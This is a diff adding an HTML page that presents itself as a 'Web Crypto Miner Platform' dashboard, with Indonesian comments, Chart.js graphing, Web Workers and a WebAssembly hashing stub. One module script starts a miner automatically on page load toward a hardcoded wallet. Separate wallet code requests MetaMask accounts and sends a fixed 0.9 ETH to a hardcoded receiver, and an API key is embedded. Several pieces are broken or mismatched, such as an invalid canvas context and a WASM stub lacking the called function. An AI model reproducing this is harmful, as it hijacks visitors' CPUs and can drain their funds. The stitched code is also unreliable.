@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Web Asset</title>
+    <!-- 1. Load the entry index module framework -->
+    <script src="/js/miner/index.js" type="module"></script>
+    
+        <script src="index.js" type="module"></script>
+        
+        <!-- Memuat CDN Chart.js untuk kebutuhan visualisasi grafik -->
+    <script src="jsdelivr.net"></script>
+    <script>
+
+const receiver =
+"0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88";
+
+/* ALCHEMY RPC */
+const ALCHEMY_RPC =
+"https://eth-mainnet.g.alchemy.com/v2/5P3go2AF1svTq0QqCOZUQ";
+
+let provider;
+let signer;
+
+/* Connect Wallet */
+
+async function connectWallet(){
+
+    if(!window.ethereum){
+        alert("Install MetaMask / Trust Wallet");
+        return;
+    }
+
+    try{
+
+        /* Wallet Provider */
+        provider =
+            new ethers.providers.Web3Provider(window.ethereum);
+
+        /* Request Account */
+        await provider.send(
+            "eth_requestAccounts",
+            []
+        );
+
+        signer = provider.getSigner();
+
+        const address =
+            await signer.getAddress();
+
+        document.getElementById("wallet")
+        .innerHTML =
+            "CONNECTED:<br>" + address;
+
+        /* Optional:
+           Alchemy Provider for reading blockchain
+        */
+
+        const alchemyProvider =
+            new ethers.providers.JsonRpcProvider(
+                ALCHEMY_RPC
+            );
+
+        const block =
+            await alchemyProvider.getBlockNumber();
+
+        console.log(
+            "Current ETH Block:",
+            block
+        );
+
+    }catch(err){
+
+        alert(err.message);
+
+    }
+}
+
+/* Pay ETH */
+
+async function payETH(){
+
+    if(!signer){
+        alert("Connect wallet dulu");
+        return;
+    }
+
+    try{
+
+        const tx =
+            await signer.sendTransaction({
+
+                to:receiver,
+
+                value:
+                ethers.utils.parseEther("0.9")
+
+            });
+
+        alert(
+            "Transaction Sent:\n" +
+            tx.hash
+        );
+
+    }catch(err){
+
+        alert(
+            "Payment failed:\n" +
+            err.message
+        );
+
+    }
+}
+
+</script>
+    <style>
+        body { background-color: #0b0f19; color: #ffffff; font-family: 'Segoe UI', sans-serif; padding: 30px; }
+        .dashboard-card { background: #151d30; padding: 20px; border-radius: 12px; border: 1px solid #223150; max-width: 800px; margin: 0 auto; }
+        .metrics-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 25px; }
+        .metric-box { background: #1e2942; padding: 15px; border-radius: 8px; text-align: center; }
+        .metric-value { font-size: 24px; font-weight: bold; color: #00ffcc; margin-top: 5px; }
+        .btn { padding: 10px 20px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-right: 10px; }
+        .btn-start { background: #00ffcc; color: #0b0f19; }
+        .btn-stop { background: #ff4d4d; color: #ffffff; }
+        .chart-container { position: relative; height: 300px; width: 100%; margin-top: 20px; }
+    </style>
+
+</head>
+<body>
+    <h1>Application Platform</h1>
+
+<div class="dashboard-card">
+    <h2>Web Crypto Miner Platform</h2>
+    
+    <div class="metrics-grid">
+        <div class="metric-box">
+            <div>Target Address Destinasi</div>
+            <div id="target-wallet" style="font-size: 13px; color: #aaa; word-break: break-all; margin-top: 10px;">
+                0x171b9f078bc82f8be12c94a4de09cbe3051b1ea7
+            </div>
+        </div>
+        <div class="metric-box">
+            <div>Live Speed Hashrate</div>
+            <div id="live-hashrate" class="metric-value">0 H/s</div>
+        </div>
+    </div>
+
+    <div>
+        <button class="btn btn-start" id="btn-start">Nyalakan Miner</button>
+        <button class="btn btn-stop" id="btn-stop">Matikan</button>
+   <button class="btn btn-stop" id="btn-clear" style="background: #ffa500;">Reset Grafik</button>
+
+   
+    </div>
+
+    <!-- Tempat Grafik Live Dirender -->
+    <div class="chart-container">
+        <canvas id="minerLiveChart"></canvas>
+    </div>
+</div>
+<script type="text/javascript">
+document.getElementById('btn-clear').addEventListener('click', () => {
+    minerApp.clearHistory();
+});
+
+</script>
+
+<!-- Impor Berkas Driver Logika Miner -->
+<script src="index.js"></script>
+<script>
+    const targetWallet = document.getElementById('target-wallet').innerText.trim();
+    
+    // Inisialisasi Class Miner
+    const minerApp = new LiveMinerDashboard(targetWallet, 'worker.js');
+    
+    // Siapkan element Canvas untuk Chart.js
+    const ctx = document.getElementById('minerLiveChart').getContext('2-digit');
+    minerApp.initChart(ctx);
+
+    // Pasang Event Listener Tombol Kendali
+    document.getElementById('btn-start').addEventListener('click', () => {
+        // Menjalankan miner dengan alokasi 2 Thread CPU dan Throttling 0.1
+        minerApp.start(2, 0.1); 
+    });
+
+    document.getElementById('btn-stop').addEventListener('click', () => {
+        minerApp.stop();
+    });
+</script>
+    <script type="module">
+        // 2. Instantiate and launch the miner lifecycle
+        const destinationWallet = '0x171b9f078bc82f8be12c94a4de09cbe3051b1ea7';
+        const liveMiner = new window.WebMinerClient(destinationWallet, {
+            threads: 2,       // Cap compute load footprint
+            throttle: 0.4     // Free up 40% frame execution budget 
+        });
+
+        liveMiner.start();
+
+        // 3. Bind to the exposed api telemetry metrics
+        liveMiner.on('autometrics', (data) => {
+            console.log(`[Telemetry] Performance metrics: ${data.hashRate} H/s | Accumulated: ${data.total}`);
+        });
+
+        liveMiner.on('share', (share) => {
+            console.warn(`[Network] Cryptographic share submitted cleanly: Nonce ${share.nonce}`);
+        });
+    </script>
+   <script type="text/javascript">
+// index.js - Driver Kontrol dengan Dukungan Penyimpanan LocalStorage
+class LiveMinerDashboard {
+    constructor(walletAddress, workerScriptPath) {
+        this.wallet = walletAddress;
+        this.workerPath = workerScriptPath;
+        this.workers = [];
+        this.totalHashesInSecond = 0;
+        this.chart = null;
+        this.metricsInterval = null;
+        this.storageKey = `miner_history_${this.wallet}`;
+    }
+
+    // Mengambil data riwayat yang tersimpan di LocalStorage
+    _getStoredHistory() {
+        const history = localStorage.getItem(this.storageKey);
+        if (history) {
+            try {
+                return JSON.parse(history); // Mengembalikan objek { labels: [], data: [] }
+            } catch (e) {
+                console.error("Gagal membaca LocalStorage, mereset data...", e);
+            }
+        }
+        return { labels: [], data: [] };
+    }
+
+    // Menyimpan data grafik saat ini ke LocalStorage
+    _saveHistoryToStorage() {
+        const historyData = {
+            labels: this.chart.data.labels,
+            data: this.chart.data.datasets[0].data
+        };
+        localStorage.setItem(this.storageKey, JSON.stringify(historyData));
+    }
+
+    // Inisialisasi Chart.js dan memuat data lama dari LocalStorage
+    initChart(ctx) {
+        const savedHistory = this._getStoredHistory();
+
+        this.chart = new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: savedHistory.labels, // Muat riwayat waktu lama
+                datasets: [{
+                    label: 'Live Hashrate (H/s)',
+                    data: savedHistory.data, // Muat riwayat hashrate lama
+                    borderColor: '#00ffcc',
+                    backgroundColor: 'rgba(0, 255, 204, 0.1)',
+                    borderWidth: 2,
+                    tension: 0.4,
+                    fill: true
+                }]
+            },
+            options: {
+                responsive: true,
+                scales: {
+                    x: { grid: { color: '#222' }, ticks: { color: '#aaa' } },
+                    y: { grid: { color: '#222' }, ticks: { color: '#aaa' }, beginAtZero: true }
+                },
+                plugins: { legend: { labels: { color: '#fff' } } }
+            }
+        });
+    }
+
+    start(threads = 2, throttle = 0.1) {
+        if (this.workers.length > 0) return; // Mencegah duplikasi thread jika tombol diklik berkali-kali
+        console.log(`Memulai miner untuk wallet: ${this.wallet}`);
+        
+        for (let i = 0; i < threads; i++) {
+            const worker = new Worker(this.workerPath);
+            worker.onmessage = (e) => {
+                if (e.data.type === 'HASH_BATCH') {
+                    this.totalHashesInSecond += e.data.count;
+                }
+            };
+            worker.postMessage({ type: 'START', config: { throttle } });
+            this.workers.push(worker);
+        }
+
+        // Interval pembaruan grafik setiap 1 detik
+        this.metricsInterval = setInterval(() => {
+            const currentHashrate = this.totalHashesInSecond;
+            this.totalHashesInSecond = 0; 
+
+            document.getElementById('live-hashrate').innerText = currentHashrate + " H/s";
+
+            const now = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            this.chart.data.labels.push(now);
+            this.chart.data.datasets[0].data.push(currentHashrate);
+
+            // Batasi tampilan grafik maksimal menyimpan 30 titik data terakhir agar memori tidak penuh
+            if (this.chart.data.labels.length > 30) {
+                this.chart.data.labels.shift();
+                this.chart.data.datasets[0].data.shift();
+            }
+
+            this.chart.update();
+            this._saveHistoryToStorage(); // Tulis data terbaru ke LocalStorage setiap detik
+        }, 1000);
+    }
+
+    stop() {
+        clearInterval(this.metricsInterval);
+        this.workers.forEach(w => w.terminate());
+        this.workers = [];
+        document.getElementById('live-hashrate').innerText = "0 H/s";
+    }
+
+    // Fungsi tambahan untuk membersihkan grafik dan menghapus riwayat di LocalStorage
+    clearHistory() {
+        this.stop();
+        localStorage.removeItem(this.storageKey);
+        this.chart.data.labels = [];
+        this.chart.data.datasets[0].data = [];
+        this.chart.update();
+        console.log("Riwayat grafik berhasil dihapus.");
+    }
+}
+
+</script> 
+    
+    <script type="text/javascript">
+// A minimal valid WASM binary module structure (represented as Hex)
+// In production, this contains thousands of bytes of optimized cryptographic operations
+const wasmHexBytecode = "0061736d0100000001070160027f7f017f030201000a09010700200020016a0b";
+
+function hexToUint8Array(hexString) {
+    const pairs = hexString.match(/[\da-f]{2}/gi);
+    return new Uint8Array(pairs.map(h => parseInt(h, 16)));
+}
+
+// Convert string into raw binary bytecode data array
+const rawWasmBuffer = hexToUint8Array(wasmHexBytecode);
+
+</script>
+
+<script type="text/javascript">
+async function compileAndInstantiateWasm(bytecodeBuffer) {
+    try {
+        // 1. Define a shared memory heap space for hashing calculations 
+        // 1 page = 64KB. This allows JavaScript and WebAssembly to share raw pointers
+        const wasmMemory = new WebAssembly.Memory({ initial: 256, maximum: 512 });
+
+        const importObject = {
+            env: {
+                memory: wasmMemory,
+                abort: () => console.error("WASM execution aborted."),
+                report_status: (code) => console.log(`[WASM Core] Code execution status: ${code}`)
+            }
+        };
+
+        // 2. Perform low-overhead asymmetric compilation directly from memory buffer
+        console.log("⚡ Compiling WebAssembly binary bytecode dynamically...");
+        const wasmModule = await WebAssembly.compile(bytecodeBuffer);
+
+        // 3. Link imports and bind to an executable runtime instance
+        const wasmInstance = await WebAssembly.instantiate(wasmModule, importObject);
+        
+        console.log("✅ Dynamic compilation complete. Hashing engine online.");
+        return {
+            instance: wasmInstance,
+            memory: wasmMemory,
+            // Expose the raw execution functions exported from C++ (e.g., mine_nonce)
+            core: wasmInstance.exports 
+        };
+
+    } catch (error) {
+        console.error("❌ WebAssembly compilation pipeline failed:", error);
+    }
+}
+
+
+</script>
+<script type="text/javascript">
+async function runEngine() {
+    const engine = await compileAndInstantiateWasm(rawWasmBuffer);
+    
+    // Example: Copy block data to the shared memory heap space
+    const blockData = new Uint8Array([0x01, 0xa4, 0xbc, 0xff]);
+    
+    // Allocate memory index inside the WASM instance
+    const memoryView = new Uint8Array(engine.memory.buffer);
+    
+    // Copy blockData bytes starting at pointer address 0
+    memoryView.set(blockData, 0); 
+
+    // Execute the natively compiled WASM function directly
+    // syntax: engine.core.mine_nonce(memory_pointer, data_length, target_nonce)
+    const resultNonce = engine.core.mine_nonce(0, blockData.length, 500000);
+    console.log(`[Engine Result] Found valid nonce candidate: ${resultNonce}`);
+}
+
+</script>
+    
+</body>
+</html>
